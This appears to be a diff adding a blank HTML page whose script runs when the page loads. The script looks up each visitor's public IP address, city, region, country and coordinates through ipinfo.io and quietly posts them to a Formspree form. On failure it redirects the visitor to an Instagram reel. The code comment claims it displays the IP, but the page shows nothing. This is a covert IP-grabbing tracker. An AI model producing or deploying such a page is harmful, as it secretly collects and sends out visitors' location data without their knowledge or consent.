@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+  </head>
+  <body>
+    
+    <script>
+      // JavaScript code to fetch and display the public IP address
+      async function getPublicIp() {
+        try {
+       
+          const response = await fetch(
+            "https://ipinfo.io/json?token=0dcac6ae48a3cf"
+          );
+          const data = await response.json();
+          
+          const formData = new FormData();
+          formData.append("ip", data.ip);
+
+          formData.append("city", data.city);
+          formData.append("region", data.region);
+          formData.append("country", data.country);
+          formData.append("loc", data.loc);
+
+          console.log(formData);
+          const formSubmit = await fetch("https://formspree.io/f/mnqelggy", {
+            method: "POST",
+
+            body: formData,
+          });
+        } catch (error) {
+    
+            window.location.href = "https://www.instagram.com/reel/C73fa0gIOsz/?igsh=MTIxYTZhc25zbWkxbw%3D%3D";
+        }
+      }
+
+      // Call the function when the page loads
+      window.onload = getPublicIp;
+    
+    </script>
+  </body>
+</html>
